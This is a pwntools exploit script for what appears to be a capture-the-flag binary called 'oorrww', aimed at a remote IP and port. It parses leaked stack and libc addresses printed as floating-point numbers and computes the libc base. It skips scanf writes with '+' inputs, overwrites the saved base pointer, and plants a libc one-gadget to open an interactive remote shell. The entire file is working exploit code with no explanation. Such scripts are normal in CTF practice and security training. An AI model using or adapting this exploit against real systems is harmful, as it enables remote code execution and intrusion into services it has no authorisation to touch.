#!/usr/bin/env python3

from pwn import *
import struct

exe = ELF("./oorrww_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            r = gdb.debug(exe, gdbscript='b main')
    else:
        r = remote("193.148.168.30", 7666)

    return r


def main():
    r = conn()

    r.recvuntil(b'here are gifts for you: ')
    x = float(r.recvuntil(b'e-310').decode('utf-8'))
    scanf = float(r.recvuntil(b'e-310').decode('utf-8'))
    x_hex = hex(struct.unpack('<Q', struct.pack('<d', x))[0])
    scanf_hex = hex(struct.unpack('<Q', struct.pack('<d', scanf))[0])
    info(f"input:{x_hex}")
    info(f"scanf:{scanf_hex}")

    libcbase = int(scanf_hex, 16) - 0x62090
    info(f"libcbase:{hex(libcbase)}")

    rce = libcbase + 0xebc85
    rbp = int(x_hex, 16) + 0x148

    chain = str(struct.unpack('d', struct.pack('Q', rce))[0]).encode('utf-8')
    info(f"gadget:{hex(rce)}")
    info(f"chain:{chain}")

    # input("waiting")

    for i in range(20):
        r.sendlineafter(b'input:', b'+')
    r.sendlineafter(b'input:', str(struct.unpack('d', struct.pack('Q', rbp))[0]).encode('utf-8'))
    r.sendlineafter(b'input:', chain)
    
    r.interactive()

if __name__ == "__main__":
    main()